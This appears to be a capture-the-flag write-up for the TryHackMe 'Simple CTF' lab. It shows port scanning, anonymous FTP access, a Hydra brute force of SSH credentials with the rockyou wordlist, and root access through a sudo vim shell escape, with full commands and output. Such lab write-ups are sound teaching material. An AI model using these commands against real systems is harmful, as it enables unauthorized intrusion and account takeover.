# Simple CTF

Link to the room: https://tryhackme.com/room/easyctf

## Let's start !!

First, we set an IP variable

````````
export IP=10.10.82.18
````````

### Rustscan

As always we start with rustscan I like its style and it instantly gives a response after discovering an open port. The drawback is that we cannot scan it for UDP.

````````
rustscan -a $IP -- -A -sC -oN nmap.txt
````````

````````
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.82.18:21
Open 10.10.82.18:80
Open 10.10.82.18:2222
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 15:16 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:16
Completed NSE at 15:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:16
Completed NSE at 15:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:16
Completed NSE at 15:16, 0.00s elapsed
Initiating Ping Scan at 15:16
Scanning 10.10.82.18 [4 ports]
Completed Ping Scan at 15:16, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:16
Completed Parallel DNS resolution of 1 host. at 15:16, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:16
Scanning 10.10.82.18 [3 ports]
Discovered open port 80/tcp on 10.10.82.18
Discovered open port 21/tcp on 10.10.82.18
Discovered open port 2222/tcp on 10.10.82.18
Completed SYN Stealth Scan at 15:16, 0.22s elapsed (3 total ports)
Initiating Service scan at 15:16
Scanning 3 services on 10.10.82.18
Completed Service scan at 15:16, 6.44s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.82.18
Retrying OS detection (try #2) against 10.10.82.18
Initiating Traceroute at 15:16
Completed Traceroute at 15:16, 0.28s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 15:16
Completed Parallel DNS resolution of 2 hosts. at 15:16, 0.07s elapsed
DNS resolution of 2 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.82.18.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:16
NSE: [ftp-bounce 10.10.82.18:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.76% done; ETC: 15:17 (0:00:00 remaining)
Completed NSE at 15:17, 31.15s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 1.37s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Nmap scan report for 10.10.82.18
Host is up, received reset ttl 63 (0.23s latency).
Scanned at 2022-05-31 15:16:21 IST for 45s

PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.126.243
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 5.4 (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=5/31%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6295E41A%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10B%TI=Z%II=I%TS=A)
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%TG=40%W=6903%O=M505NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 19.334 days (since Thu May 12 07:16:05 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   264.43 ms 10.8.0.1
2   264.52 ms 10.10.82.18

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.17 seconds
           Raw packets sent: 85 (7.288KB) | Rcvd: 35 (2.200KB)

````````
So we have 3 ports open 21(FTP) ,80(HTTP) , 2222(ssh) . First, let's check what is in FTP... 

### FTP 

````````
ftp $IP
````````

````````
Connected to 10.10.82.18.
220 (vsFTPd 3.0.3)
Name (10.10.82.18:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40903|)
ftp: Can't connect to `10.10.82.18:40903': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> mget *
mget ForMitch.txt [anpqy?]? 
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |********************************************************************************************************************************|   166      304.71 KiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (0.82 KiB/s)
ftp> 

````````
Here we found a file called ForMitch.txt let us see what is inside. It says that mitch is the worst dev and his password is very weak.
so, We can try to brute force it...

### Hydra 

````````
hydra -l mitch -s 2222 -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 6
````````

````````
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-31 14:54:42
[DATA] max 6 tasks per 1 server, overall 6 tasks, 14344399 login tries (l:1/p:14344399), ~2390734 tries per task
[DATA] attacking ssh://10.10.82.18:2222/
[2222][ssh] host: 10.10.82.18   login: mitch   password: {REDACTED}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-31 14:55:35

````````
YESS!!! we have successfully bruteforce the password. now let's log in as user mitch via ssh...

## Getting our first flag.

````````
pwncat-cs mitch@$IP -p 2222
````````

````````
[14:57:30] Welcome to pwncat 🐈!                                                                                                                              __main__.py:164
Password: ******
[14:57:38] 10.10.82.18:2222: upgrading from /bin/dash to /bin/bash                                                                                             manager.py:957
[14:57:39] 10.10.82.18:2222: registered new host w/ db                                                                                                         manager.py:957
(local) pwncat$                                                                                                                                                              
(remote) mitch@Machine:/home/mitch$ ls
user.txt
(remote) mitch@Machine:/home/mitch$ cat user.txt 
{REDACTED}
(remote) mitch@Machine:/home/mitch$ cd ..
(remote) mitch@Machine:/home$ ls
mitch  sunbath
(remote) mitch@Machine:/home$ cd sunbath/
bash: cd: sunbath/: Permission denied
(remote) mitch@Machine:/home$ ls
mitch  sunbath

````````
Okey, we have our first flag. now let's escalate our privilege and get root.txt...

## Privilage esculation 

````````
sudo /usr/bin/vim -c ':!/bin/sh'
````````

````````
(remote) mitch@Machine:/home/mitch$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
(remote) mitch@Machine:/home/mitch$ sudo /usr/bin/vim -c ':!/bin/sh'

# ^[[2;2R^[]11;rgb:0000/0000/0000^G
/bin/sh: 1: ot found
/bin/sh: 1: 2R: not found
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
{REDACTED}
# 

````````

- DONE 

